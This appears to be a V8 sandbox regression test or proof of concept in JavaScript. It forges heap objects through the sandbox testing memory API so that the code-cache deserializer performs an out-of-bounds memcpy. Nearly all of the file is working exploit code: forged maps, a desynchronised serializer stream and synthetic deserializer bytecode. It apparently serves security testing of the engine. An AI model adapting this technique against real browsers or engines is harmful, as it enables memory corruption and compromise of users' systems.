// Copyright 2026 the V8 project authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

// Flags: --sandbox-testing --cache=after-execute

function target() {}
target();

let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
let target_addr = Sandbox.getAddressOf(target);
let sfi_addr = (memory.getUint32(target_addr + 16, true) - 1) & 0xffffffff;

let fixed_array_map = 0x5dd;
let byte_array_map = 0x9ad;
let swiss_map = 0xc5d;

// Allocate carrier arrays
let carrier_dict1 = new Array(64);
let dict1_addr = (memory.getUint32(Sandbox.getAddressOf(carrier_dict1) + 8, true) - 1) & 0xffffffff;

let carrier_ba1 = new Array(64);
let ba1_addr = (memory.getUint32(Sandbox.getAddressOf(carrier_ba1) + 8, true) - 1) & 0xffffffff;

let carrier_ba2 = new Array(256);
let ba2_addr = (memory.getUint32(Sandbox.getAddressOf(carrier_ba2) + 8, true) - 1) & 0xffffffff;

let carrier_fa = new Array(256);
let fa_addr = (memory.getUint32(Sandbox.getAddressOf(carrier_fa) + 8, true) - 1) & 0xffffffff;

// Zero carrier buffers
for (let i = 0; i < 256; i += 4) memory.setUint32(dict1_addr + i, 0, true);
for (let i = 0; i < 256; i += 4) memory.setUint32(ba1_addr + i, 0, true);
for (let i = 0; i < 512; i += 4) memory.setUint32(ba2_addr + i, 0, true);
for (let i = 0; i < 512; i += 4) memory.setUint32(fa_addr + i, 0, true);

// Setup meta table ByteArray for dict1
memory.setUint32(ba1_addr + 0, byte_array_map, true);
memory.setUint32(ba1_addr + 4, 16, true);

// Setup payload carrier ByteArray (ba2)
memory.setUint32(ba2_addr + 0, byte_array_map, true);
memory.setUint32(ba2_addr + 4, 256, true);

// Format SwissNameDictionary (capacity = 1 -> unaligned SizeFor = 42 bytes -> 2 leftover bytes)
memory.setUint32(dict1_addr + 0, swiss_map, true);
memory.setUint32(dict1_addr + 4, 0, true);               // hash
memory.setUint32(dict1_addr + 8, 1, true);               // capacity = 1
memory.setUint32(dict1_addr + 12, ba1_addr + 1, true);   // meta_table -> ba1

// Stream desynchronization via leftover bytes at dict1 offset 40, 41:
// Opcode 0x11 (kVariableRawData) consuming 3 tagged words (12 bytes)
// to skip the ByteArray serialization header of ba2.
memory.setUint8(dict1_addr + 40, 0x11);
memory.setUint8(dict1_addr + 41, 0x0c);                  // (3 << 2) | 0 = 12

// Construct synthetic deserializer byte stream inside ba2 payload:
let p = ba2_addr + 8;
memory.setUint8(p + 0, 0x00);                            // 12th skipped byte

// Bytecode: kOffHeapBackingStore (0x0d)
memory.setUint8(p + 1, 0x0d);
// byte_length: 65536 bytes (0x00010000)
// Deserializer allocates 64KB backing store and triggers unchecked memcpy
// beyond the end of the host heap snapshot buffer (CopyRaw).
memory.setUint32(p + 2, 65536, true);

// Format FixedArray linking dict1 and ba2
memory.setUint32(fa_addr + 0, fixed_array_map, true);
memory.setUint32(fa_addr + 4, 91 << 1, true);            // length = Smi(91)
memory.setUint32(fa_addr + 8, dict1_addr + 1, true);     // elements[0] = dict1
memory.setUint32(fa_addr + 12, ba2_addr + 1, true);      // elements[1] = ba2

// Attach corrupted FixedArray to target function SFI untrusted_function_data
memory.setUint32(sfi_addr + 8, fa_addr + 1, true);
